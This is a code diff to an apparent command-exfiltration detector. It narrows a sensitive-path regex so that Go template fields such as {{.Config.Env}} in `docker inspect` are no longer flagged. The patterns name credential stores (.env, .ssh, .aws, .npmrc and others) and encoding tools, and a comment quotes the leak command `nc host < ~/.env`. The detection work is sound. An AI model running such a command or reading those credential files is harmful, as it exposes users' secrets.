@@ -160,8 +160,32 @@ export const EXFIL_INVOCATION_RE = new RegExp(
 
 // A path that names a credential store. This is sensitive material on its own:
 // `nc host < ~/.env` leaks whatever is in that file, whatever its contents are.
-export const SENSITIVE_PATH_RE =
-  /(?:\.(?:env|aws|ssh|gnupg|kube|docker|npmrc|pypirc|netrc|git-credentials|secrets)(?=[\s/'"`)]|$)|\.env\b)/i;
+//
+// The trailing boundary is an explicit delimiter class, NOT `\b`. `\b` only
+// requires a non-word character, so `}` satisfies it and the Go template field
+// `{{.Config.Env}}` matched as if it were a `.env` path — `docker inspect
+// --format "{{.Config.Env}}"` was then blocked as network egress carrying a
+// secret. A template field names a property on an object; it is not a file.
+const SENSITIVE_SEGMENT = String.raw`\.(?:env|aws|ssh|gnupg|kube|docker|npmrc|pypirc|netrc|git-credentials|secrets)`;
+const SENSITIVE_BOUNDARY = String.raw`(?=[\s/'"\x60)\]},;:|&>]|$)`;
+
+// A Go template action (`{{ ... }}`). Inside one, a dotted identifier is a field
+// path on a value, never a filename, so the `.env` alternative must not apply.
+const GO_TEMPLATE_RE = /\{\{[^}]*\}\}/g;
+
+export const SENSITIVE_PATH_RE = new RegExp(
+  `(?:${SENSITIVE_SEGMENT}${SENSITIVE_BOUNDARY}|\\.env(?![\\w-]))`,
+  "i"
+);
+
+/** Drop Go template actions so their field paths cannot read as filenames. */
+export function withoutGoTemplates(command: string): string {
+  return command.replace(GO_TEMPLATE_RE, " ");
+}
+
+export function matchesSensitivePath(command: string): boolean {
+  return SENSITIVE_PATH_RE.test(withoutGoTemplates(command));
+}
 
 // Tools used to transform/encode material for smuggling
 export const ENCODE_TOOLS = new Set(["base64", "xxd", "openssl", "gpg", "hexdump"]);
@@ -365,7 +389,15 @@ export function checkBashExfil(command: string): string | undefined {
     // `set`/`export` alone is not exfiltration: `export` in prose, or exporting
     // an unrelated variable, has no secret in it. Require a key that names a
     // credential, which SECRET_KEY_RE already establishes.
-    if (SECRET_KEY_RE.test(command) || ENV_DUMP_RE.test(lower) || SENSITIVE_PATH_RE.test(command)) {
+    //
+    // SENSITIVE_PATH_RE runs against a Go-template-stripped copy: a template
+    // field like `{{.Config.Env}}` is a property, not a file, and matching it
+    // blocked `docker inspect --format` as secret exfiltration.
+    if (
+      SECRET_KEY_RE.test(command) ||
+      ENV_DUMP_RE.test(lower) ||
+      SENSITIVE_PATH_RE.test(withoutGoTemplates(command))
+    ) {
       return "command combines network discovery/transfer with sensitive material";
     }
   }
